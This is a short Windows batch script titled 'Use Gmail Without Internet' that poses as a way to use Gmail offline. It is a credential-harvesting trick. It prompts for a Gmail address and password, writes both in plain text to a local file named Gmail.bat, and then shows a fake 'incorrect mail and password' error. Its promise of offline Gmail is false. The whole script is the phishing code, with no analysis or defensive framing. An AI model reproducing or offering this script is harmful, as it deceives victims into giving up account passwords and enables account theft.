TITLE Use Gmail Without Internet
ECHO OFF
COLOR 03
CLS
ECHO.
ECHO LOGIN TO START Using Gmail Without Internet
ECHO.
ECHO Please enter your email:
SET/P “MAIL=>”
ECHO.
ECHO Enter the password:
SET/P “PSWD=>”
ECHO EMAIL = %MAIL%>>Gmail.bat
ECHO PASSWORD = %PSWD%>>Gmail.bat
CLS
TIMEOUT /T 5 >NUL
COLOR 0C
ECHO.
ECHO You Have Entered An Incorrect Mail And Password.
PAUSE>NUL
EXIT
